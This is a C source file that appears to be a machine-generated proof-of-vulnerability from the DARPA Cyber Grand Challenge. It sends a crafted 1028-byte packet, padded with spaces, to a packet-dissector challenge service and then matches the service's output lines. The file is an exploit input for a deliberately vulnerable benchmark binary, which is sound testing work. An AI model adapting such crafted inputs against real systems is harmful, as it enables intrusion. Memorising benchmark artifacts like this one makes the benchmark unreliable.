#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x3d\x75\x8b\x94"
         "\x65\xbb\x8c\x30\x6a\x51\x85\xba\x8e\x00\x00\x00\x70\x14\xfc\xdb"
         "\xd6\xa8\x70\x10\xbf\x09\xd9\x1e\xac\x0e\xea\x0d\x1d\x71\x5b\x60"
         "\x85\xf3\xda\x53\xbf\xb6\x43\x47\x60\x60\x0d\xec\xe5\x24\x51\x22"
         "\xcc\x1d\x69\xcf\x79\xea\x92\x1d\x43\x1f\x73\xc2\x2b\x5a\x3e\x0a"
         "\xd2\x56\xc9\x07\xf3\xdd\x03\x38\x9c\x69\xae\x07\x39\x2b\xa1\xdb"
         "\x71\x2e\x65\xa9\x45\x73\x4e\x4c\xd1\x10\x0e\xc1\x84\x40\x06\x61"
         "\x80\x66\xe1\xf1\x96\x27\x92\x9a\x71\x9a\x27\xa8\xd0\x4d\xa4\xcb"
         "\x9b\x32\x29\xfa\x30\x54\x78\xc6\x7a\xcc\x02\x80\x3f\x51\x47\x12"
         "\x19\xff\x3d\x9c\x00\x78\x83\x63\x87\xf6\xec\x40\xee\xbd\x97\xf6"
         "\x75\xfc\xaa\x99\xf6\xf1\xc4\xf1\x79\xb2\x5f\xe3\x32\xc0\x30\x64"
         "\x5d\x66\x33\x66\xc2\x08\xfc\xf1\x6a\xf6\x81\x90\x16\x72\xc1\xc3"
         "\x70\x06\x4c\xa0\x51\x19\xfc\x30\x06\x03\xed\xc9\x5c\x44\x5a\x2e"
         "\x2e\x9e\x9d\x4a\xa6\x93\x04\x05\x80\x4b\x15\x52\x49\x75\x56\xc5"
         "\xdb\x02\xe5\x23\x9b\x2f\xde\x09\xcb\xc1\x7d\xe8\xd5\xef\xb6\xf4"
         "\x04\x94\x53\xe3\x71\xc0\x95\x0e\xe8\x3a\x74\x6c\xc5\x68\x5e\x18"
         "\xdf\xa2\xdd\xe4\x6e\x5f\x61\xf3\x96\xad\x38\xc3\x55\xda\xdf\x8b"
         "\x46\xee\x9b\xc0\xdb\x4f\xb9\x9f\x18\x48\x3c\x84\xac\x3a\xcb\xf2"
         "\x18\x94\x17\x65\x24\xb2\xcf\x55\xea\x6a\x6f\xc7\xdf\x16\x51\x43"
         "\x5d\x6a\x4c\x94\xda\xb3\x7d\x68\x80\xad\x29\xab\xf9\x18\xa6\xef"
         "\xb1\x78\xcf\x67\xbc\xd2\x0c\x35\xe0\xb7\xd9\xf7\x00\x76\xda\x26"
         "\x0d\xaa\xb5\xdf\xda\xf8\x00\x92\x38\x60\x60\x93\x6f\xa1\x48\x5e"
         "\x32\x67\x20\x03\x71\x09\xc9\x22\x98\xb1\xe7\x46\x6c\x9d\xf8\x92"
         "\x28\xfe\x45\xb6\x26\x4f\x60\xf2\x38\xba\x6b\xc8\x1c\xac\x17\x6c"
         "\xec\xc7\x7c\x60\x00\x11\xfb\x2b\x57\xdf\x90\x9e\xab\x94\xa0\x1a"
         "\xac\xc0\xba\x21\x7d\xae\xe6\x43\x18\x53\xf9\xa2\x7a\xea\x3b\x13"
         "\x6e\x60\x60\x00\xe5\x8e\xeb\x74\xa2\x41\x76\x2a\xea\xc9\xcf\x6d"
         "\x9e\x6f\x84\x21\x81\x97\x85\x69\xce\x3b\x76\x82\x0c\xf1\xff\x43"
         "\x66\xc4\x74\x02\xf4\x2e\x4b\xfb\x39\x32\xbd\xa6\x1e\x3b\xe5\x0e"
         "\x57\xee\x02\x8b\x41\x71\x6d\xd2\x6f\xf7\x0f\xae\x27\xd2\x48\x9a"
         "\xc5\x13\xc9\x4c\xfc\x0a\x36\xd2\x15\x1d\x67\x05\xa9\x42\xc0\x10"
         "\x68\x2f\x37\xf0\xfe\x67\x19\xfa\x83\xa5\x94\x87\xfa\xf1\x9b\x65"
         "\xf1\x61\x73\x05\x2c\x71\x48\x73\xfc\x76\xf1\xf6\x63\x6d\xc3\x34"
         "\xb0\xf8\xc3\x8d\xd3\x68\x12\x73\xa6\x92\x3a\xef\x50\xb8\x9f\xde"
         "\x30\xeb\x5f\x24\xdd\x08\x41\x56\xe9\xbc\x25\xef\xf8\x1a\x38\x78"
         "\x94\xdb\xcc\x6e\x10\x09\xc9\x13\x5c\x8d\x34\xeb\x5f\xc5\x83\x39"
         "\xea\xc5\xe3\x31\xe2\xe7\xb6\xb0\x13\x51\xe6\xed\xf6\x97\x80\x60"
         "\x00\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===prelanguagecloudage
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x70\x72\x65\x6c\x61\x6e\x67\x75\x61\x67\x65"
         "\x63\x6c\x6f\x75\x64\x61\x67\x65";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
